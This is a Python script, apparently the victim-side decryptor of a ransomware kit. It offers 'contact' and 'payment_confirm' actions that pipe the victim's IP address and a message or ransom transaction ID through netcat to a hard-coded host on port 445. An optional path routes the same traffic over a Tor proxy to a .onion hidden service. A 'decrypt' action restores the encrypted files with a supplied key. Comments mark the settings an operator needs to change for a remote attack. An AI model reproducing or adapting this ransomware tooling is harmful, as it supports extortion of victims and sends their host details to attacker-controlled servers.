#!/usr/bin/env python3
# encoding :utf-8

from RansomUtil import Encryption
import argparse
import subprocess
import socket

def tor_contact(msg:str):
    proxy_ip = "10.154.0.73" # (4) need to change
    hidden_service_ip = "2hnsi6uuzr4jjasestpmahhfdehsrbvvv6zfc6gxaqpnsosjbdpnyqyd.onion" # (5) need to change
    victim_ip = socket.gethostbyname(socket.gethostname())
    msg = '\nFrom :' + victim_ip + '\nMsg : ' + msg + '\n'
    subprocess.run(f'echo "{msg}" | nc -w3 -X 5 -x {proxy_ip}:9050 {hidden_service_ip} 445', shell=True)

def contact(msg:str):
    victim_ip = socket.gethostbyname(socket.gethostname())
    msg = '\nFrom :' + victim_ip + '\nMsg : ' + msg + '\n'
    subprocess.run(f'echo "{msg}" | nc -w3 10.170.0.99 445', shell=True)


def decrypt(priv_key:str):
    dec = Encryption()
    #if customized FileExt, FileSig, and TargetDir when encrypt files, 
    #customization is also needed when decrypt files
    
    #dec.setEncFileExt('won')   # ......... (1)
    #dec.setEncFileSig('WON!')  # ......... (2)
    #dec.setTargetFolder('/tmp/tmp') # .....(3)
    
    #When you lauch attack remotely, set key path to "../enc_priv_key"
    dec.decryptFiles(priv_key, enc_pri_key_path="../enc_priv_key")

parser = argparse.ArgumentParser(prog='decryptor.py')
parser.add_argument('action', choices=['contact', 'decrypt', 'payment_confirm'])

args = parser.parse_args()
if args.action == 'contact':
    msg = input('msg to send: ')
    #tor_contact(msg) #............(6)
    contact(msg)
    exit(0)
elif args.action == 'payment_confirm':
    trxId = input('input your transactionId: ')
    msg = 'trxId : ' + trxId
    #tor_contact(msg) #............(7)
    contact(msg)
    exit(0)
elif args.action == 'decrypt':
    key_path = input('decrypt key path: ')
    decrypt(key_path)
    exit(0)

